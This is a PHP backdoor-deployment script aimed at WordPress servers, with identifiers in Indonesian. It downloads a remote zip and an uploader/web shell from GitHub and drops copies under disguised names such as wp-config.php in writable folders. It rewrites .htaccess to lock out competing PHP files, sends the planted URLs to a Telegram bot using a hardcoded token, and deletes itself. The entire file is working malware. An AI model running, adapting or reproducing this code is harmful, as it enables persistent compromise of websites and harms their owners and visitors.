<?php
error_reporting(0);
set_time_limit(0);
$botToken = "8389098682:AAFTPObfdl_xC18WaVY5CsRl5ReXBMBXbvg";
$chatId   = "-1003872848823";
$folderName  = 'shop';
$zipUrl      = 'https://raw.githubusercontent.com/lastman1105-spec/deploy/refs/heads/main/004.zip';
$uploaderUrl = 'https://raw.githubusercontent.com/lastman1105-spec/deploy/refs/heads/main/save.php';
$whitelistNames = [
    'config.php', 'fetch.php', 'tn.php', 'epep.php', '1a.php', 'a.php', 
    'wp-config-sample.php', 'hp23.php', 'hp4.php', 'darks.php', 
    'wp-config.php', 'wp-trackback.php', 'wp-content-css.php', 'wp-hader-css.php', 
    'style-css.php', 'wp-login.php', 'wp-blog-header.php', 'file-manager.php', 
    'index.php', 'xrsoot.php'
];
function cari_pintu_depan() {
    $path = __DIR__;
    while ($path !== '/' && $path !== '.' && $path !== dirname($path)) {
        if (is_dir($path . '/wp-content')) return $path;
        $path = dirname($path);
    }
    return $_SERVER['DOCUMENT_ROOT'] ?? __DIR__;
}
function sedot($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }
    return @file_get_contents($url);
}

function kirim_tele($pesan, $token, $id) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $id,
        'text' => $pesan,
        'parse_mode' => 'HTML'
    ];
    
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 15);
        $result = curl_exec($ch);
        curl_close($ch);
        return $result;
    }
    
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
            'timeout' => 15
        ]
    ];
    $context = stream_context_create($options);
    return @file_get_contents($url, false, $context);
}

function scan_variasi_dir($baseDir, &$results, $depth = 0, $min = 3, $limit = 10) {
    if (count($results) >= $limit) return;
    $dirs = @glob($baseDir . '/*', GLOB_ONLYDIR | GLOB_NOSORT);
    if (!$dirs) return;
    shuffle($dirs); 
    foreach ($dirs as $dir) {
        if (count($results) >= $limit) return;
        $baseName = basename($dir);
        if (in_array($baseName, ['cgi-bin', 'node_modules', '.git', 'cache', 'wp-admin', 'wp-includes'])) continue;
        if ($depth >= $min && is_writable($dir)) {
            $parent = dirname($dir);
            $alreadyUsed = false;
            foreach ($results as $r) { 
                if (dirname($r) === $parent) { 
                    $alreadyUsed = true; 
                    break; 
                } 
            }
            if (!$alreadyUsed) { 
                $results[] = $dir; 
            }
        }
        scan_variasi_dir($dir, $results, $depth + 1, $min, $limit);
    }
}

$rootDir = cari_pintu_depan();
$proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
$host = $_SERVER['HTTP_HOST'] ?? 'localhost';

$targetPath = $rootDir . '/' . $folderName;
$status_shop = "GAGAL";
if (!is_dir($targetPath)) @mkdir($targetPath, 0755, true);

if (is_dir($targetPath)) {
    $zipData = sedot($zipUrl);
    if ($zipData) {
        $zipFile = $targetPath . '/new.zip';
        file_put_contents($zipFile, $zipData);
        if (file_exists($zipFile) && class_exists('ZipArchive')) {
            $zip = new ZipArchive;
            if ($zip->open($zipFile) === TRUE) {
                $zip->extractTo($targetPath . '/');
                $zip->close();
                @unlink($zipFile);
                if (file_exists($targetPath . '/fetch.php')) {
                    $status_shop = "BERHASIL (0755)";
                }
            }
        }
    }
}

$uploaderContent = sedot($uploaderUrl);
$stealth_results = [];
$targets = [];
scan_variasi_dir($rootDir, $targets, 0, 3, 10);

if ($uploaderContent && !empty($targets)) {
    $allowListStr = implode('|', $whitelistNames);
    foreach ($targets as $dir) {
        $namaFile = $whitelistNames[array_rand($whitelistNames)];
        $pathFile = $dir . '/' . $namaFile;
        $pathHt   = $dir . '/.htaccess';

        if (file_put_contents($pathFile, $uploaderContent)) {
            $htaccess  = "<FilesMatch \".*\.(phtml|php|PhP|php5|suspected)$\">\n";
            $htaccess .= "Order allow,deny\nDeny from all\n</FilesMatch>\n";
            $htaccess .= "<FilesMatch \"^($allowListStr)$\">\n";
            $htaccess .= "Order allow,deny\nAllow from all\n</FilesMatch>\n";
            $htaccess .= "<IfModule mod_rewrite.c>\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\.php$ - [L]\n";
            $htaccess .= "RewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . index.php [L]\n</IfModule>";

            file_put_contents($pathHt, $htaccess);

            $stealth_results[] = $pathFile;
        }
    }
}

$report = "DEPLOY REPORT - " . $host . "\n";
$report .= "------------------------------------\n";
$report .= "Shop Status: " . $status_shop . "\n";
if (strpos($status_shop, "BERHASIL") !== false) {
    $report .= "Main: " . $proto . "://" . $host . "/" . $folderName . "/fetch.php\n";
}
$report .= "\nStealth Backups:\n";

if (!empty($stealth_results)) {
    foreach ($stealth_results as $fullPath) {
        $relativeLink = str_replace($rootDir, '', $fullPath);
        $report .= "- " . $proto . "://" . $host . $relativeLink . "\n";
    }
} else {
    $report .= "Tidak ada folder writable ditemukan.\n";
}
$report .= "------------------------------------\n";
$report .= "Script self-destructed for safety.";

kirim_tele($report, $botToken, $chatId);

echo "<pre>";
echo "Deployment Finished.\n";
echo "Report has been sent to Telegram.\n";
echo "----------------------------------\n";
echo $report;
echo "</pre>";

@unlink(__FILE__);
?>
